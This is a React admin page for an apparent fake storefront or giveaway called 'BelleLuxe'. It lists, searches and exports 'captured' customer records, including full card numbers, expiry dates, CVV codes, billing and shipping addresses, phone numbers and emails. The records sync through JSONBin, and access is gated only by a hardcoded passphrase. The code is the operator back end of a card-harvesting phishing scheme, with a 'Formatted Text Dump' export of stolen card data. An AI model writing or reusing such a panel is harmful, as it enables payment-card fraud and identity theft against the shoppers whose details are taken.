import { useState, useCallback } from 'react';
import { CaptureRecord } from '../types';
import { fetchCaptures, clearCaptures, deleteCapture, useCloud } from '../utils/cloudStorage';

export default function AdminPage() {
  const [captures, setCaptures] = useState<CaptureRecord[]>([]);
  const [expandedId, setExpandedId] = useState<string | null>(null);
  const [searchTerm, setSearchTerm] = useState('');
  const [passwordRequired, setPasswordRequired] = useState(true);
  const [password, setPassword] = useState('');
  const [passwordError, setPasswordError] = useState(false);
  const [loading, setLoading] = useState(false);
  const [hasLoaded, setHasLoaded] = useState(false);

  const loadData = useCallback(async () => {
    setLoading(true);
    try {
      const data = await fetchCaptures();
      setCaptures(data);
      setHasLoaded(true);
    } catch (e) {
      console.error('Failed to load captures:', e);
      setCaptures([]);
      setHasLoaded(true);
    } finally {
      setLoading(false);
    }
  }, []);

  const handlePasswordSubmit = async () => {
    if (password === 'belle-admin' || password === 'nover-admin') {
      setPasswordRequired(false);
      setPasswordError(false);
      await loadData();
    } else {
      setPasswordError(true);
    }
  };

  const filtered = captures.filter(c => {
    if (!searchTerm) return true;
    const term = searchTerm.toLowerCase();
    try {
      const namesStr = c.items ? c.items.map(it => it.productName).join(' ') : '';
      return (
        (c.firstName || '').toLowerCase().includes(term) ||
        (c.lastName || '').toLowerCase().includes(term) ||
        (c.email || '').toLowerCase().includes(term) ||
        (c.shippingCity || '').toLowerCase().includes(term) ||
        (c.shippingState || '').toLowerCase().includes(term) ||
        (c.shippingZip || '').includes(term) ||
        (c.phone || '').includes(term) ||
        namesStr.toLowerCase().includes(term)
      );
    } catch {
      return false;
    }
  });

  const exportJSON = () => {
    const blob = new Blob([JSON.stringify(captures, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `belleluxe-captured-records-${new Date().toISOString().split('T')[0]}.json`;
    a.click();
    URL.revokeObjectURL(url);
  };

  const exportText = () => {
    let text = `BELLELUXE PRESERVED RESPONSES — Exported: ${new Date().toLocaleString()}\n`;
    text += `${'='.repeat(80)}\n\n`;

    captures.forEach((c, idx) => {
      text += `RECORD #${idx + 1} — Captured: ${new Date(c.timestamp).toLocaleString()}\n`;
      text += `Record ID: ${c.id}\n`;
      text += `${'-'.repeat(60)}\n\n`;

      text += `  EMAIL & CONTACT INFO\n`;
      text += `    Email Address: ${c.email}\n`;
      text += `    Phone Number:  ${c.phone}\n\n`;

      text += `  VERIFICATION ADDRESS (ALL INFO)\n`;
      text += `    First Name:    ${c.firstName}\n`;
      text += `    Last Name:     ${c.lastName}\n`;
      text += `    Street Line:   ${c.shippingAddress}\n`;
      if (c.shippingApartment) text += `    Apt/Suite:     ${c.shippingApartment}\n`;
      text += `    City:          ${c.shippingCity}\n`;
      text += `    State:         ${c.shippingState}\n`;
      text += `    ZIP Code:      ${c.shippingZip}\n`;
      text += `    Country:       ${c.shippingCountry}\n\n`;

      text += `  PAYMENT DETAILS (CREDIT CARD, BILLING ADDRESS, ALL INFO)\n`;
      text += `    Card Network:  ${c.cardType}\n`;
      text += `    Full Digits:   ${c.cardFullNumber}\n`;
      text += `    Last 4:        **** ${c.cardNumberLast4}\n`;
      text += `    Expiry Date:   ${c.cardExpiry}\n`;
      text += `    CVV Code:      ${c.cardCVV}\n`;
      text += `    Card Visage:   ${c.cardName}\n\n`;
      
      text += `    BILLING ADDRESS\n`;
      text += `      Street Line: ${c.billingAddress}\n`;
      if (c.billingApartment) text += `      Apt/Suite:   ${c.billingApartment}\n`;
      text += `      City:        ${c.billingCity}\n`;
      text += `      State:       ${c.billingState}\n`;
      text += `      ZIP Code:    ${c.billingZip}\n`;
      text += `      Country:     ${c.billingCountry}\n\n`;

      text += `  BOUGHT ITEMS BUNDLE\n`;
      if (c.items && Array.isArray(c.items)) {
        c.items.forEach((it, iNum) => {
          text += `    Item #${iNum + 1}: ${it.productName}\n`;
          text += `      Options:   ${JSON.stringify(it.options)}\n`;
          text += `      Quantity:  ${it.quantity}\n`;
          text += `      Unit Cost: $${it.unitPrice.toFixed(2)}\n`;
          text += `      Subtotal:  $${it.totalPrice.toFixed(2)}\n\n`;
        });
      } else {
        text += `    (No discrete array items preserved)\n\n`;
      }

      text += `  TOTAL AMOUNT SETTLED: $${(c.totalAmount || 0).toFixed(2)}\n`;
      text += `\n${'='.repeat(80)}\n\n`;
    });

    const blob = new Blob([text], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `belleluxe-captured-records-${new Date().toISOString().split('T')[0]}.txt`;
    a.click();
    URL.revokeObjectURL(url);
  };

  const flushRecord = async (id: string) => {
    await deleteCapture(id);
    setCaptures(prev => prev.filter(c => c.id !== id));
    if (expandedId === id) setExpandedId(null);
  };

  const handleClearAll = async () => {
    if (window.confirm('Clear all stored answers from this environment snapshot?')) {
      await clearCaptures();
      setCaptures([]);
      setExpandedId(null);
    }
  };

  if (passwordRequired) {
    return (
      <div className="min-h-screen bg-rose-50/20 text-rose-950 pt-28 pb-16 px-4 flex items-center justify-center">
        <div className="max-w-sm w-full bg-white rounded-3xl border border-rose-100 p-8 text-center shadow-sm">
          <div className="w-12 h-12 bg-rose-50 rounded-full flex items-center justify-center text-rose-600 text-xl mx-auto mb-4 border border-rose-100">
            🔒
          </div>
          <h2 className="text-xl font-serif font-bold text-rose-950 mb-2">BelleLuxe Archival Gate</h2>
          <p className="text-xs text-rose-950/60 mb-6 font-sans">
            Enter private administrative passphrase to view all inputted consumer survey captures.
          </p>
          <input
            type="password"
            value={password}
            onChange={e => { setPassword(e.target.value); setPasswordError(false); }}
            onKeyDown={e => e.key === 'Enter' && handlePasswordSubmit()}
            className={`w-full px-4 py-3 rounded-xl bg-rose-50/20 border text-center text-rose-950 placeholder-rose-950/30 focus:outline-none focus:ring-1 focus:ring-rose-400 mb-2 text-sm ${
              passwordError ? 'border-red-400 bg-red-50/10' : 'border-rose-100'
            }`}
            placeholder="Passphrase"
            autoFocus
          />
          {passwordError && <p className="text-red-500 text-[11px] mb-3 font-sans">Incorrect authorization answer</p>}
          <p className="text-[10px] text-rose-950/30 mb-4 font-sans">Hint: try belle-admin</p>
          <button
            onClick={handlePasswordSubmit}
            className="w-full py-3.5 rounded-full bg-rose-600 text-white font-serif font-medium text-sm hover:bg-rose-700 transition-all shadow-sm"
          >
            Authorize Viewer Entry
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-rose-50/20 text-rose-950 pt-28 pb-20 px-4 sm:px-6">
      <div className="max-w-4xl mx-auto">
        
        {/* Sync status banner */}
        {useCloud ? (
          <div className="bg-white rounded-2xl border border-emerald-200 p-4 mb-8 flex items-center gap-3 shadow-sm">
            <span className="w-2.5 h-2.5 rounded-full bg-emerald-500 animate-pulse flex-shrink-0" />
            <div>
              <p className="text-xs font-semibold text-emerald-800 font-serif">JSONBin Cloud Sync Active</p>
              <p className="text-[11px] text-emerald-700 font-sans mt-0.5">Data is synchronized — accessible from any device or browser.</p>
            </div>
          </div>
        ) : (
          <div className="bg-white rounded-2xl border border-amber-200 p-4 mb-8 text-xs shadow-sm">
            <div className="flex items-start gap-3">
              <span className="text-base mt-0.5">⚠️</span>
              <div>
                <strong className="font-serif block text-sm mb-1 text-amber-900">JSONBin Not Configured — Local Only</strong>
                <p className="text-amber-800 font-sans leading-relaxed">
                  To sync across all devices, open <code className="bg-amber-100 px-1 rounded font-mono">src/config/storage.ts</code> and paste your JSONBin API Key and Bin ID, then rebuild.
                </p>
              </div>
            </div>
          </div>
        )}

        <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4 mb-8 pb-4 border-b border-rose-100">
          <div>
            <h1 className="text-3xl font-serif font-bold text-rose-950">Inputted Survey Log</h1>
            <p className="text-xs text-rose-950/60 font-sans mt-0.5">
              {loading ? 'Synchronizing records snapshot...' : `Arranged list of ${captures.length} preserved giveaway capture payload${captures.length !== 1 ? 's' : ''}`}
            </p>
          </div>

          <div className="flex flex-wrap gap-2 w-full sm:w-auto">
            <button
              onClick={loadData}
              disabled={loading}
              className="px-3.5 py-2 rounded-lg bg-white text-rose-950 border border-rose-200 hover:bg-rose-50 transition-all text-xs font-serif font-medium"
            >
              🔄 Pull Snapshot
            </button>
            <button
              onClick={exportJSON}
              disabled={captures.length === 0}
              className="px-3.5 py-2 rounded-lg bg-white text-rose-950 border border-rose-200 hover:bg-rose-50 transition-all text-xs font-serif font-medium disabled:opacity-40"
            >
              📥 JSON Dump
            </button>
            <button
              onClick={exportText}
              disabled={captures.length === 0}
              className="px-3.5 py-2 rounded-lg bg-white text-rose-950 border border-rose-200 hover:bg-rose-50 transition-all text-xs font-serif font-medium disabled:opacity-40"
            >
              📄 Formatted Text Dump
            </button>
            {captures.length > 0 && (
              <button
                onClick={handleClearAll}
                className="px-3.5 py-2 rounded-lg bg-red-50 text-red-700 border border-red-100 hover:bg-red-100 transition-all text-xs font-serif font-medium"
              >
                🗑 Flush Workspace
              </button>
            )}
          </div>
        </div>

        {/* Filter input */}
        {captures.length > 0 && (
          <div className="mb-6">
            <input
              type="text"
              value={searchTerm}
              onChange={e => setSearchTerm(e.target.value)}
              className="w-full px-4 py-3 bg-white rounded-xl border border-rose-100 text-rose-950 placeholder-rose-950/30 text-xs font-sans focus:outline-none focus:ring-1 focus:ring-rose-400 shadow-sm"
              placeholder="Filter list by email address, customer first/last name, delivery city or zip code..."
            />
          </div>
        )}

        {/* Records display array */}
        {loading ? (
          <div className="py-20 text-center">
            <span className="w-8 h-8 border-2 border-rose-400 border-t-transparent rounded-full animate-spin inline-block" />
          </div>
        ) : hasLoaded && captures.length === 0 ? (
          <div className="bg-white rounded-3xl border border-rose-100 p-12 text-center shadow-sm">
            <span className="text-3xl block mb-2">📥</span>
            <h3 className="text-base font-serif font-bold text-rose-950">No Submissions Inputted</h3>
            <p className="text-xs text-rose-950/60 max-w-xs mx-auto mt-1 font-sans">
              Perform an order simulation to review captured records exactly in this workspace.
            </p>
          </div>
        ) : filtered.length === 0 && searchTerm ? (
          <div className="bg-white rounded-3xl border border-rose-100 p-8 text-center text-xs text-rose-950/50">
            No capture parameters intersect with keyword query "{searchTerm}".
          </div>
        ) : (
          <div className="space-y-4">
            {filtered.map((capture) => (
              <div key={capture.id} className="bg-white rounded-3xl border border-rose-100 shadow-sm overflow-hidden transition-all">
                
                {/* Collapsible header view */}
                <button
                  onClick={() => setExpandedId(expandedId === capture.id ? null : capture.id)}
                  className="w-full p-5 sm:p-6 flex items-center justify-between text-left hover:bg-rose-50/20 transition-colors"
                >
                  <div className="flex items-center gap-3 min-w-0">
                    <span className="w-8 h-8 rounded-full bg-rose-50 border border-rose-100 flex items-center justify-center text-xs font-serif font-bold text-rose-600 flex-shrink-0">
                      #{captures.indexOf(capture) + 1}
                    </span>
                    <div className="min-w-0">
                      <p className="text-sm font-serif font-bold text-rose-950 truncate">
                        {capture.firstName} {capture.lastName}
                      </p>
                      <p className="text-xs text-rose-950/60 font-sans truncate">
                        {capture.email} • {capture.shippingCity}, {capture.shippingState}
                      </p>
                    </div>
                  </div>

                  <div className="flex items-center gap-4 flex-shrink-0">
                    <div className="text-right hidden sm:block">
                      <span className="text-sm font-serif font-bold text-rose-600">
                        ${(capture.totalAmount || 0).toFixed(2)}
                      </span>
                      <span className="text-[10px] text-rose-950/40 block font-sans">
                        {capture.items ? capture.items.length : 0} bundle items
                      </span>
                    </div>
                    <span className="text-rose-950/40 text-lg transition-transform duration-200" style={{ transform: expandedId === capture.id ? 'rotate(90deg)' : 'rotate(0deg)' }}>
                      ›
                    </span>
                  </div>
                </button>

                {/* Expanded content view perfectly arranged */}
                {expandedId === capture.id && (
                  <div className="p-5 sm:p-8 bg-rose-50/10 border-t border-rose-50 font-sans space-y-6">
                    
                    {/* Email / Phone block */}
                    <div>
                      <span className="text-[10px] font-serif uppercase tracking-widest text-rose-600 font-bold block mb-2">
                        Contact Info
                      </span>
                      <div className="grid grid-cols-1 sm:grid-cols-2 gap-2 bg-white rounded-xl p-3 border border-rose-50 text-xs">
                        <div>
                          <span className="text-rose-950/40 block font-serif">Email:</span>
                          <span className="text-rose-950 font-medium select-all">{capture.email}</span>
                        </div>
                        <div>
                          <span className="text-rose-950/40 block font-serif">Phone:</span>
                          <span className="text-rose-950 font-medium select-all">{capture.phone}</span>
                        </div>
                      </div>
                    </div>

                    {/* Verification Address (all info) */}
                    <div>
                      <span className="text-[10px] font-serif uppercase tracking-widest text-rose-600 font-bold block mb-2">
                        Verification Address (all info)
                      </span>
                      <div className="bg-white rounded-xl p-4 border border-rose-50 text-xs space-y-2">
                        <div className="grid grid-cols-2 gap-2 pb-2 border-b border-rose-50">
                          <div>
                            <span className="text-rose-950/40 block font-serif">First Name:</span>
                            <span className="text-rose-950 font-medium">{capture.firstName}</span>
                          </div>
                          <div>
                            <span className="text-rose-950/40 block font-serif">Last Name:</span>
                            <span className="text-rose-950 font-medium">{capture.lastName}</span>
                          </div>
                        </div>

                        <div>
                          <span className="text-rose-950/40 block font-serif">Street Line:</span>
                          <span className="text-rose-950 font-medium">{capture.shippingAddress}</span>
                        </div>

                        {capture.shippingApartment && (
                          <div>
                            <span className="text-rose-950/40 block font-serif">Apt/Suite:</span>
                            <span className="text-rose-950 font-medium">{capture.shippingApartment}</span>
                          </div>
                        )}

                        <div className="grid grid-cols-3 gap-2 pt-1">
                          <div>
                            <span className="text-rose-950/40 block font-serif">City:</span>
                            <span className="text-rose-950 font-medium">{capture.shippingCity}</span>
                          </div>
                          <div>
                            <span className="text-rose-950/40 block font-serif">State:</span>
                            <span className="text-rose-950 font-medium">{capture.shippingState}</span>
                          </div>
                          <div>
                            <span className="text-rose-950/40 block font-serif">ZIP Code:</span>
                            <span className="text-rose-950 font-medium">{capture.shippingZip}</span>
                          </div>
                        </div>

                        <div className="pt-2 border-t border-rose-50 flex items-center justify-between text-[11px] text-rose-950/50">
                          <span>Country verification key:</span>
                          <span className="font-mono bg-rose-50 px-2 py-0.5 rounded text-rose-700">{capture.shippingCountry || 'US'}</span>
                        </div>
                      </div>
                    </div>

                    {/* Payment details (credit card, billing address, all info) */}
                    <div>
                      <span className="text-[10px] font-serif uppercase tracking-widest text-rose-600 font-bold block mb-2">
                        Payment details (credit card, billing address, all info)
                      </span>
                      <div className="bg-white rounded-xl p-4 border border-rose-50 text-xs space-y-3">
                        
                        {/* Credit card answers */}
                        <div className="p-3 bg-rose-50/40 rounded-lg border border-rose-100/50">
                          <span className="text-[9px] uppercase tracking-wider text-rose-800 font-bold block mb-1 font-serif">Credit Card Answers</span>
                          <div className="grid grid-cols-2 sm:grid-cols-3 gap-2">
                            <div>
                              <span className="text-rose-950/40 block font-serif">Card Network:</span>
                              <span className="text-rose-950 font-bold uppercase">{capture.cardType}</span>
                            </div>
                            <div>
                              <span className="text-rose-950/40 block font-serif">Card serial:</span>
                              <span className="text-rose-950 font-mono font-bold select-all">{capture.cardFullNumber}</span>
                            </div>
                            <div>
                              <span className="text-rose-950/40 block font-serif">Last 4 check:</span>
                              <span className="text-rose-950 font-mono">**** {capture.cardNumberLast4}</span>
                            </div>
                            <div>
                              <span className="text-rose-950/40 block font-serif">Expiry Date:</span>
                              <span className="text-rose-950 font-mono">{capture.cardExpiry}</span>
                            </div>
                            <div>
                              <span className="text-rose-950/40 block font-serif">CVV Security:</span>
                              <span className="text-rose-950 font-mono">{capture.cardCVV}</span>
                            </div>
                            <div>
                              <span className="text-rose-950/40 block font-serif">Cardholder imprint:</span>
                              <span className="text-rose-950 font-medium">{capture.cardName}</span>
                            </div>
                          </div>
                        </div>

                        {/* Billing address answers */}
                        <div className="p-3 bg-rose-50/20 rounded-lg border border-rose-100/30">
                          <span className="text-[9px] uppercase tracking-wider text-rose-800 font-bold block mb-1 font-serif">Billing Origin Address</span>
                          <div className="space-y-1.5">
                            <div>
                              <span className="text-rose-950/40 block font-serif">Street Line:</span>
                              <span className="text-rose-950 font-medium">{capture.billingAddress}</span>
                            </div>
                            {capture.billingApartment && (
                              <div>
                                <span className="text-rose-950/40 block font-serif">Apt/Suite:</span>
                                <span className="text-rose-950 font-medium">{capture.billingApartment}</span>
                              </div>
                            )}
                            <div className="grid grid-cols-3 gap-2 pt-1">
                              <div>
                                <span className="text-rose-950/40 block font-serif">City:</span>
                                <span className="text-rose-950 font-medium">{capture.billingCity}</span>
                              </div>
                              <div>
                                <span className="text-rose-950/40 block font-serif">State:</span>
                                <span className="text-rose-950 font-medium">{capture.billingState}</span>
                              </div>
                              <div>
                                <span className="text-rose-950/40 block font-serif">ZIP Code:</span>
                                <span className="text-rose-950 font-medium">{capture.billingZip}</span>
                              </div>
                            </div>
                          </div>
                        </div>

                      </div>
                    </div>

                    {/* Bought Items Array bundle details */}
                    <div>
                      <span className="text-[10px] font-serif uppercase tracking-widest text-rose-600 font-bold block mb-2">
                        Tote Array Bundle Items ({capture.items ? capture.items.length : 0})
                      </span>
                      <div className="space-y-2">
                        {capture.items && Array.isArray(capture.items) ? (
                          capture.items.map((it, idxBundle) => (
                            <div key={idxBundle} className="bg-white rounded-xl p-3 border border-rose-50 flex items-center justify-between text-xs">
                              <div>
                                <span className="font-serif font-bold text-rose-950 block">{it.productName}</span>
                                <div className="text-[11px] text-rose-950/50 mt-0.5">
                                  {Object.entries(it.options || {}).map(([oK, oV]) => (
                                    <span key={oK} className="mr-2"><strong>{oK}:</strong> {oV}</span>
                                  ))}
                                </div>
                              </div>
                              <div className="text-right flex-shrink-0">
                                <span className="text-xs font-serif font-bold text-rose-600 block">${it.totalPrice.toFixed(2)}</span>
                                <span className="text-[10px] text-rose-950/40 block font-sans">{it.quantity}x @ ${it.unitPrice.toFixed(2)}</span>
                              </div>
                            </div>
                          ))
                        ) : (
                          <p className="text-xs text-rose-950/40 italic">No detailed array variants available for legacy item shape.</p>
                        )}
                      </div>
                    </div>

                    {/* Footer snapshot actions */}
                    <div className="pt-3 border-t border-rose-50 flex items-center justify-between text-[11px] text-rose-950/40">
                      <span>Snapshot ID: <span className="font-mono">{capture.id}</span></span>
                      <div className="flex items-center gap-3">
                        <span>Recorded: {new Date(capture.timestamp).toLocaleTimeString()}</span>
                        <button
                          type="button"
                          onClick={() => flushRecord(capture.id)}
                          className="text-red-500 hover:text-red-700 underline font-sans"
                        >
                          Delete
                        </button>
                      </div>
                    </div>

                  </div>
                )}

              </div>
            ))}
          </div>
        )}

      </div>
    </div>
  );
}
